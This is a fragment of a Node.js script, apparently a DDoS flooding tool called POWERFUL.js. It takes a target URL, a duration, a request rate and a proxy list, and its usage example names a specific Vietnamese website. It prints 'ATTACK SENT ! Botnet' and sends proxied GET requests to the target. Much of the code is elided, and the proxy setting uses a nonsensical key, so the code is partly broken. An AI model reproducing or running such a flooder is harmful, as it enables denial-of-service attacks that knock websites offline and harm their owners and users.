...
async function poptto() {
    if (process.argv.length !== 6) {
        ...
        console.log(`vi du : node POWERFUL.js https://nguyenquockhang.vn 120 1000 dmtproxy.txt`);
        process.exit(0);
    }else{
        ...
        if (process.argv[5] == 'off') {
            console.log("ATTACK SENT ! Botnet")
        ...
        function run() {
            if (process.argv[5] !== 'off') {
                ...
                var proxiedRequest = request.defaults({'ATTACK SENT': 'http://'+proxy});
                var config = {
                    method: 'get',
                    url: target,
                    headers: {
